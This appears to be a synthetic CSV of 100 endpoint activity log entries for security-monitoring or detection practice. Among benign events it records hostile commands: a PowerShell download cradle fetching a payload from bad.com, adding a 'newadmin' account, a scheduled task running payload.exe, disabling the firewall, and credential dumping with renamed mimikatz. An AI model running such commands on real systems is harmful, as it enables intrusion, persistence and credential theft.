log_id,timestamp,user_id,asset_id,activity_type,details
1,2023-10-26T13:00:02Z,jsmith,1,file-access,"Accessed C:\Users\jsmith\Documents\report.docx"
2,2023-10-26T13:01:10Z,jdoe,3,application-run,"Launched C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
3,2023-10-26T13:02:15Z,rjohnson,6,file-write,"Modified \\fileserver\shared\project_x\plan.xlsx"
4,2023-10-26T13:03:28Z,ewilliams,8,login,"Successful login from 192.168.1.14"
5,2023-10-26T13:04:45Z,mbrown,10,process-create,"powershell.exe -ExecutionPolicy Bypass -File C:\temp\script.ps1"
6,2023-10-26T13:05:50Z,jgarcia,11,logout,"User jgarcia logged off"
7,2023-10-26T13:06:32Z,dmiller,13,file-delete,"Deleted C:\Users\dmiller\Downloads\old_file.zip"
8,2023-10-26T13:07:21Z,srodriguez,15,application-run,"Launched C:\Program Files\Google\Chrome\Application\chrome.exe"
9,2023-10-26T13:08:18Z,dmartinez,16,network-share-access,"Accessed share \\fileserver\public"
10,2023-10-26T13:09:09Z,chernandez,18,registry-modify,"Modified HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
11,2023-10-26T13:10:11Z,elopez,20,print-job,"Printed document 'confidential-report.pdf' on PRINTER-01"
12,2023-10-26T13:11:29Z,wgonzalez,21,file-upload,"Uploaded 'design_mockup.png' to webapp.corp.com/upload"
13,2023-10-26T13:12:38Z,lperez,23,application-install,"Installation of 'vlc-3.0.16-win64.exe' started"
14,2023-10-26T13:13:42Z,jwilson,26,file-read,"Read data from \\db-server\finance_db\customer_table"
15,2023-10-26T13:14:55Z,sanderson,28,process-terminate,"Terminated process 'hung_app.exe' (PID: 1234)"
16,2023-10-26T13:15:43Z,ttaylor,30,login-failure,"Failed login attempt for user ttaylor from 203.0.113.15"
17,2023-10-26T13:16:30Z,cmoore,31,usb-insert,"USB Mass Storage Device detected (Kingston DataTraveler)"
18,2023-10-26T13:17:22Z,pjackson,33,file-rename,"Renamed C:\temp\doc.tmp to C:\temp\doc.exe"
19,2023-10-26T13:18:19Z,cwhite,35,application-run,"Launched C:\Windows\System32\cmd.exe"
20,2023-10-26T13:19:07Z,bharris,36,file-access,"Accessed network share \\fileserver\HR\salaries.csv"
21,2023-10-26T13:20:12Z,mmartin,38,file-download,"Downloaded 'game_installer.exe' from suspicious-site.com"
22,2023-10-26T13:21:28Z,nthompson,40,logout,"User nthompson logged off"
23,2023-10-26T13:22:35Z,agarcia,41,login,"Successful login from 192.168.1.33"
24,2023-10-26T13:23:40Z,kmartinez,43,application-run,"Launched 'nmap.exe -sV 10.0.0.0/24'"
25,2023-10-26T13:24:51Z,srobinson,46,file-write,"Modified C:\Users\srobinson\Documents\personal.txt"
26,2023-10-26T13:25:39Z,lclark,48,process-create,"whoami.exe"
27,2023-10-26T13:26:27Z,klewis,50,file-access,"Accessed C:\Windows\System32\sam"
28,2023-10-26T13:27:15Z,brodriguez,51,usb-eject,"USB Mass Storage Device ejected"
29,2023-10-26T13:28:08Z,mwalker,53,registry-read,"Read value from HKLM\System\CurrentControlSet\Services\Tcpip\Parameters"
30,2023-10-26T13:29:19Z,hhall,56,application-uninstall,"Uninstallation of 'OldApp version 1.2' completed"
31,2023-10-26T13:30:25Z,pallen,58,file-access,"Accessed 'archive.zip' on removable drive E:"
32,2023-10-26T13:31:33Z,syoung,60,login-failure,"Failed login attempt for user syoung from 198.51.100.37"
33,2023-10-26T13:32:41Z,jking,61,file-delete,"Deleted folder C:\Users\jking\Documents\old_project"
34,2023-10-26T13:33:50Z,swright,63,application-run,"Launched C:\tools\procmon.exe"
35,2023-10-26T13:34:42Z,jlopez,65,network-share-access,"Accessed share \\10.0.1.25\installers"
36,2023-10-26T13:35:38Z,chill,66,file-write,"Modified C:\ProgramData\App\config.xml"
37,2023-10-26T13:36:29Z,ascott,68,process-create,"rundll32.exe shell32.dll;ShellExec_RunDLL not-a-virus.exe"
38,2023-10-26T13:37:17Z,lgreen,70,login,"Successful login from 192.168.1.50"
39,2023-10-26T13:38:06Z,radams,71,logout,"User radams logged off"
40,2023-10-26T13:39:11Z,jbaker,73,file-access,"Accessed C:\Users\Public\Documents\shared.pdf"
41,2023-10-26T13:40:20Z,pnelson,76,application-run,"C:\Windows\System32\wbem\WMIC.exe process call create 'calc.exe'"
42,2023-10-26T13:41:25Z,dcarter,78,file-upload,"Uploaded 'presentation.pptx' to onedrive.live.com"
43,2023-10-26T13:42:18Z,rmitchell,80,login-failure,"Failed login attempt for user rmitchell from 203.0.113.29"
44,2023-10-26T13:43:09Z,fperez,81,usb-insert,"USB Mass Storage Device detected (SanDisk Cruzer)"
45,2023-10-26T13:44:12Z,broberts,83,file-rename,"Renamed script.js to script.js.txt"
46,2023-10-26T13:45:28Z,wturner,85,application-run,"Launched 'regedit.exe'"
47,2023-10-26T13:46:33Z,jphillips,86,file-access,"Multiple read failures for \\restricted-share\data"
48,2023-10-26T13:47:40Z,acampbell,88,process-create,"tasklist.exe"
49,2023-10-26T13:48:51Z,dparker,90,print-job,"Cancelled print job 'large-book.pdf' on PRINTER-SF-02"
50,2023-10-26T13:49:59Z,gevans,91,file-delete,"Deleted file from Recycle Bin"
51,2023-10-26T13:50:45Z,cedwards,93,application-run,"Launched 'ms-excel.exe' with command line args '-f \\remote\file.csv'"
52,2023-10-26T13:51:32Z,cstewart,98,login,"Successful login from 192.168.1.66"
53,2023-10-26T13:52:18Z,hsanchez,100,logout,"User hsanchez logged off"
54,2023-10-26T13:53:05Z,jsmith,1,application-run,"Launched 'slack.exe'"
55,2023-10-26T13:54:11Z,jdoe,3,file-access,"Accessed C:\Users\jdoe\Desktop\meeting_notes.txt"
56,2023-10-26T13:55:20Z,rjohnson,6,file-write,"Modified C:\Windows\System32\drivers\etc\hosts"
57,2023-10-26T13:56:31Z,ewilliams,8,application-run,"Launched 'mstsc.exe' to connect to 10.0.0.5"
58,2023-10-26T13:57:48Z,mbrown,10,process-create,"net user newadmin /add"
59,2023-10-26T13:58:52Z,jgarcia,11,file-access,"Accessed browser history file 'History' in Chrome profile"
60,2023-10-26T13:59:39Z,dmiller,13,login-failure,"Failed login for non-existent user 'admin'"
61,2023-10-26T14:00:27Z,srodriguez,15,file-download,"Downloaded 'patch.zip' from unknown-url.com/updates"
62,2023-10-26T14:01:16Z,dmartinez,16,network-share-access,"Failed to access share \\fileserver\restricted"
63,2023-10-26T14:02:08Z,chernandez,18,registry-delete,"Deleted key HKCU\Software\MyOldApp"
64,2023-10-26T14:03:15Z,elopez,20,application-run,"Launched 'zoom.exe'"
65,2023-10-26T14:04:31Z,wgonzalez,21,file-write,"Created new file C:\Users\wgonzalez\Desktop\new_ideas.txt"
66,2023-10-26T14:05:40Z,lperez,23,application-run,"Launched 'putty.exe' to connect to 10.0.0.6"
67,2023-10-26T14:06:45Z,jwilson,26,file-access,"Accessed \\fileserver\archive\2022_data.zip"
68,2023-10-26T14:07:58Z,sanderson,28,process-terminate,"Killed process 'chrome.exe' (PID: 5678)"
69,2023-10-26T14:08:49Z,ttaylor,30,login,"Successful login from 192.168.1.26"
70,2023-10-26T14:09:35Z,cmoore,31,usb-write,"Copied 'backup.zip' to USB Mass Storage Device"
71,2023-10-26T14:10:29Z,pjackson,33,file-rename,"Renamed important.dll to important.dll.bak"
72,2023-10-26T14:11:17Z,cwhite,35,application-run,"Launched 'winscp.exe' to connect to external FTP"
73,2023-10-26T14:12:09Z,bharris,36,file-access,"Failed to access C:\Windows\security\database\secedit.sdb"
74,2023-10-26T14:13:18Z,mmartin,38,file-upload,"Uploaded 'log.txt' to pastebin.com"
75,2023-10-26T14:14:30Z,nthompson,40,application-install,"Installation of 'anydesk.msi' started"
76,2023-10-26T14:15:41Z,agarcia,41,login-failure,"Failed login attempt for user agarcia from 203.0.113.19"
77,2023-10-26T14:16:35Z,kmartinez,43,application-run,"C:\Windows\System32\schtasks.exe /Create /SC DAILY /TN 'MyTask' /TR 'C:\payload.exe'"
78,2023-10-26T14:17:49Z,srobinson,46,file-write,"Modified hosts file to redirect google.com"
79,2023-10-26T14:18:38Z,lclark,48,process-create,"systeminfo.exe"
80,2023-10-26T14:19:29Z,klewis,50,file-access,"Accessed LSA secrets using 'lsadump'"
81,2023-10-26T14:20:19Z,brodriguez,51,usb-insert,"USB device with autorun.inf detected"
82,2023-10-26T14:21:09Z,mwalker,53,registry-create,"Created new key HKCU\Software\Hidden"
83,2023-10-26T14:22:21Z,hhall,56,application-uninstall,"Uninstallation of 'Java 8 Update 151' started"
84,2023-10-26T14:23:29Z,pallen,58,file-access,"Accessed file on another user's desktop C:\Users\sanderson\Desktop\private.txt"
85,2023-10-26T14:24:35Z,syoung,60,login,"Successful login from 192.168.1.44"
86,2023-10-26T14:25:44Z,jking,61,file-delete,"Shift-deleted folder C:\Users\jking\temp_work"
87,2023-10-26T14:26:55Z,swright,63,application-run,"Launched 'wireshark.exe' and started capture"
88,2023-10-26T14:27:48Z,jlopez,65,network-share-access,"Mapped network drive Z: to \\fileserver\public"
89,2023-10-26T14:28:39Z,chill,66,file-write,"Appended data to C:\Windows\debug.log"
90,2023-10-26T14:29:28Z,ascott,68,process-create,"powershell IEX (New-Object Net.WebClient).DownloadString('http://bad.com/payload')"
91,2023-10-26T14:30:19Z,lgreen,70,login,"Successful login from 10.0.6.10"
92,2023-10-26T14:31:09Z,radams,71,file-access,"User accessed 500+ files in under a minute from \\fileserver\shared"
93,2023-10-26T14:32:15Z,jbaker,73,application-run,"Launched 'unknown_app.exe' from Downloads folder"
94,2023-10-26T14:33:22Z,pnelson,76,file-upload,"Uploaded 5GB 'archive.7z' to mega.nz"
95,2023-10-26T14:34:19Z,dcarter,78,login-failure,"Failed login - account locked out"
96,2023-10-26T14:35:08Z,rmitchell,80,usb-read,"Read 'financials.xlsx' from USB device"
97,2023-10-26T14:36:15Z,fperez,81,file-rename,"Renamed 'mimikatz.exe' to 'search.exe'"
98,2023-10-26T14:37:29Z,broberts,83,application-run,"Launched 'cain.exe'"
99,2023-10-26T14:38:31Z,wturner,85,file-access,"Failed to access encrypted file 'secret.gpg'"
100,2023-10-26T14:39:40Z,jphillips,86,process-create,"netsh advfirewall set allprofiles state off"
